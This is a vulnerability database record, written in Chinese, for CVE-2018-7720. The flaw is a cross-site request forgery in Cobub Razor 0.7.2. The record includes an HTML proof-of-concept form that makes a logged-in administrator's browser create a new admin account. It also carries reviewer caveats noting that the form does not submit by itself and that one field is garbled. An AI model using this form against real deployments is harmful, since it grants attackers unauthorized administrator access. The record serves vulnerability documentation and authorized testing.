---
source: "Mr-xn/Penetration_Testing_POC"
title: "Cobub Razor createNewUser CSRF"
product: "Cobub Razor"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2018-7720"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "0.7.2；管理员有效会话及跨站Cookie策略"
prerequisites: "需管理员访问且表单提交"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
identifier_role: "primary"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/Cobub%20Razor/Cobub%20Razor%200.7.2%E5%AD%98%E5%9C%A8%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E.md"
id: "vw-9ade883aa7957843512c2af3"
entity_id: "ve-9ade883aa7957843512c2af3"
schema_version: "1"
---

# Cobub Razor createNewUser CSRF

## 条目说明

- 对象与具体问题：Cobub Razor；createNewUser CSRF
- 版本、配置及部署条件：0.7.2；管理员有效会话及跨站Cookie策略
- 认证与权限前提：需管理员访问且表单提交
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 称打开页面即增加账号但PoC没有自动submit，需要点击按钮
- alert(document.cookie)仅攻击页自身Cookie并非CSRF必要部分，表单字段有乱码
- 持久创建管理员需风险/回滚说明；缺修复及成功响应

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

#### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|Cobub Razor 0.7.2存在跨站请求伪造漏洞|2018-03-06|Kyhvedn（yinfengwuyueyi@163.com、kyhvedn@5ecurity.cn）|[http://www.cobub.com/](http://www.cobub.com/) | [https://github.com/cobub/razor/](https://github.com/cobub/razor/) |0.7.2 | [CVE-2018-7720](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7720)|  

##### 漏洞概述  

> Cobub Razor 0.7.2存在跨站请求伪造漏洞，管理员登陆后访问特定页面可增加管理员账号。保存如下利用代码为html页面，打开页面将增加test123/test的管理员账号。  

#### POC实现代码如下：  

> 利用代码如下：
``` html
<body>
  <script>alert(document.cookie)</script>
    <form action="http://localhost/index.php?/user/createNewUser/" method="POST">
      <input type="hidden" name="username" value="test123" />
      <input type="hidden" name="email" value="test&#64;test123&#46;test" />
      <input type="hidden" name="password" value="test" />
      <input type="hidden" name="confirm&#95;password" value="test" />
      <input type="hidden" name="userrole" value="3" />
      <input type="hidden" name="user&#47;ccreateNewUser" value="�&#136;&#155;�&#187;�" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```


---

> 来源：Mr-xn/Penetration_Testing_POC
